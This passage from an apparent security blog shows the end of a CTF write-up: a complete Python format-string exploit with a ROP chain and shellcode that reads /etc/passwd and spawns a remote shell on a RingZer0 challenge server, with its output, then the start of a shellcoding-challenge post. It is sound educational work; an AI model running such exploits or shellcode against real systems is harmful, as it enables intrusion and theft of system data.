</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] wrote {} to {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)),</span> <span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="o">+</span><span class="n">where</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># grab strlen from the GOT entry</span>
</span><span class='line'><span class="n">strlen_addr</span> <span class="o">=</span> <span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] strlen is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">strlen_addr</span><span class="p">))</span>
</span><span class='line'><span class="n">libc_base</span> <span class="o">=</span> <span class="n">strlen_addr</span> <span class="o">-</span> <span class="mh">0x80c40</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] libc_base is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">STACK_PIVOT</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x082cfe</span>        <span class="c"># add rsp, 0x100; ret</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] stack pivot gadget is at {}.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to have three addresses on the stack which we can directly address</span>
</span><span class='line'><span class="c"># to use them in the format string vuln </span>
</span><span class='line'><span class="c"># strlen</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b00</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b01</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'><span class="n">write_on_stack</span><span class="p">(</span><span class="mh">0x601b02</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># need to write out the last three bytes of the STACK_PIVOT gadget over strlen&#39;s bytes</span>
</span><span class='line'><span class="n">writebytes</span> <span class="o">=</span> <span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span>   
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="n">lastbyte</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="c"># build format string to set three bytes at once</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">lastbyte</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span> 
</span><span class='line'>      <span class="n">byte_to_write</span> <span class="o">=</span> <span class="mi">256</span> <span class="o">+</span> <span class="p">(</span><span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">-</span> <span class="n">lastbyte</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}c&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">byte_to_write</span><span class="p">)</span>
</span><span class='line'>  <span class="n">lastbyte</span> <span class="o">=</span> <span class="n">writebytes</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">writebytes</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;%{}$hhn&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">format_offset</span><span class="o">+</span><span class="mi">636</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] writing {} to strlen&#39;s GOT entry&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">STACK_PIVOT</span> <span class="o">&amp;</span> <span class="mh">0xffffff</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] format string payload: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect and send the format string</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># now, strlen&#39;s GOT entry will point to the stack lifting gadget</span>
</span><span class='line'>
</span><span class='line'><span class="c"># let&#39;s prepare the ROP chain</span>
</span><span class='line'><span class="c"># here are the gadgets</span>
</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0ad215</span>
</span><span class='line'><span class="n">POP_RAX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x041dc8</span>
</span><span class='line'><span class="n">POP_RSI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x021535</span>
</span><span class='line'><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x02028b</span>
</span><span class='line'><span class="n">POP_RDX</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0a834b</span>
</span><span class='line'>
</span><span class='line'><span class="n">ropchain</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="c"># mprotect 0x400000 to rwx, so we can write AND execute from it</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>     <span class="c"># points to ret; effectively, a NOP!</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>                  <span class="c"># syscall mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer to mprotect</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># length of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>                   <span class="c"># flags; rwx</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after executing this syscall, 0x400000 should be rwx</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to fetch the socket from memory</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2028a</span><span class="p">)</span> <span class="c"># pop r15; ret</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mh">0x48</span><span class="p">)</span>               <span class="c">#</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x6933f</span><span class="p">)</span> <span class="c"># lea rax, [rbp + r15]; set rax to address that contains socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">31337</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span>             <span class="c"># junk for all the pop r64&#39;s</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xeb938</span><span class="p">)</span> <span class="c"># mov rax, [rax]; grabs value of socket descriptor</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2c10e</span><span class="p">)</span> <span class="c"># xchg eax, edi; edi now contains the socket descriptor</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read in the shellcode from the socket (sockfd in rdi already)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RAX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="c"># syscall read</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RSI</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># start of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>              <span class="c"># size of buffer</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>             <span class="c"># after this syscall, the shellcode should be at 0x400000</span>
</span><span class='line'><span class="n">ropchain</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>            <span class="c"># so return to it!</span>
</span><span class='line'>
</span><span class='line'><span class="c"># rdi still contains socket fd!</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'><span class="c"># send our ropchain</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'><span class="c"># modified read /etc/passwd, original by Mr.Un1k0d3r</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x49\x87\xff\xeb\x3e\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x90\x90\x90\x49\x87\xff\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbd\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># handle the incoming connection; in this case, grab the contents of /etc/passwd</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>parameter <span class="m">5</span> points to:  0x7fffb6657fc8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fffb6658f51
</span><span class='line'>scratch contains:  0x72632f656d6f682f
</span><span class='line'>scratch is parameter 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> strlen is at 0x7f7af6e72c40.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> libc_base is at 0x7f7af6df2000.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> stack pivot gadget is at 0x7f7af6e74cfe.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b00 to 1123
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b01 to 1124
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> wrote 0x601b02 to 1125
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> writing 0xe74cfe to strlen<span class="err">&#39;</span>s GOT entry
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> format string payload: %254c%1123<span class="nv">$hhn</span>%78c%1124<span class="nv">$hhn</span>%155c%1125<span class="nv">$hhn</span>
</span><span class='line'>
</span><span class='line'>HF Remote Secure Shell <span class="o">[</span>1.3.37<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Password:
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshuser:x:1000:1000:sshuser,,,:/home/sshuser:/bin/bash
</span><span class='line'>mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>crackme:x:1001:1001::/home/crackme:/bin/sh
</span><span class='line'>*** Connection closed by remote host ***
</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 64
</span><span class='line'>
</span><span class='line'>push rdi
</span><span class='line'>push rdi
</span><span class='line'>push <span class="m">33</span>         <span class="p">;</span> dup2
</span><span class='line'>pop rax         <span class="p">;</span> <span class="nb">set </span>rax to dup2
</span><span class='line'>                <span class="p">;</span> rdi still contains the socket fd
</span><span class='line'>xor esi, esi    <span class="p">;</span> stdin
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stdout
</span><span class='line'>syscall
</span><span class='line'>pop rdi
</span><span class='line'>inc rsi         <span class="p">;</span> stderr
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>jmp _there
</span><span class='line'>_here:
</span><span class='line'>pop rdi         <span class="p">;</span> points to /bin/sh
</span><span class='line'>xor esi, esi    <span class="p">;</span> <span class="nv">argv</span> <span class="o">=</span> NULL
</span><span class='line'>xor edx, edx    <span class="p">;</span> <span class="nv">argp</span> <span class="o">=</span> NULL
</span><span class='line'>push <span class="m">59</span>         <span class="p">;</span> execve
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>push <span class="m">60</span>         <span class="p">;</span> <span class="nb">exit</span>
</span><span class='line'>pop rax
</span><span class='line'>syscall
</span><span class='line'>
</span><span class='line'>_there:
</span><span class='line'>call _here
</span><span class='line'>db <span class="s2">&quot;/bin/sh&quot;</span>, 0
</span></code></pre></td></tr></table></div></figure>


<p>After sticking that shellcode in the exploit, I got a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x57\x57\x6a\x21\x58\x31\xf6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\x5f\x48\xff\xc6\x0f\x05\xeb\x0f\x5f\x31\xf6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00</span><span class="s">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://barrebas.github.io/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

<p>Until the next #maximumoverkill :]</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Solving the X86-64 Shellcoding Challenges of RingZer0CTF]]></title>
    <link href="http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/"/>
    <updated>2015-02-09T21:49:17+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf</id>
    <content type="html"><![CDATA[<p><a href="http://ringzer0team.com">RingZer0Team</a> is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun <strong>and</strong> I learned a ton about 64-bit shellcoding while solving them!</p>

<!-- more -->


<p>I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)</p>

<h2>Level 1</h2>

<p>Let&rsquo;s start easy. Upon connecting via <code>ssh</code>, the challenge presents us with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh level1@shellcode.ringzer0team.com -p 7771
</span><span class='line'>level1@shellcode.ringzer0team.com's password: 
</span><span class='line'>Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
</span><span class='line'>Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37
</span><span class='line'>
</span><span class='line'>RingZer0 Team CTF Shellcoding Level 1
</span><span class='line'>Submit your shellcode using hex representation "\xcc\xcd".
</span><span class='line'>Type "end" to exit.
</span><span class='line'>
</span><span class='line'>This level have no shellcode restriction.
</span><span class='line'>You main goal is to read /flag/level1.flag
</span><span class='line'>
</span><span class='line'>shellcode&gt;</span></code></pre></td></tr></table></div></figure>


<p>Although it says <em>no restriction</em>, there is one crucial restriction: NULL bytes are <strong>not</strong> allowed. This probably means that the shellcode is being copied to a buffer by <code>strcpy</code> or something similar. I found this out the hard way&hellip; Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this <a href="http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64">x64 syscall table</a> which lists all the syscalls and the arguments.</p>

<p>To avoid NULL bytes, registers can be zeroed by using <code>xor</code>. To set a byte-sized value, the value can be <code>push</code>ed and then <code>pop</code>ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
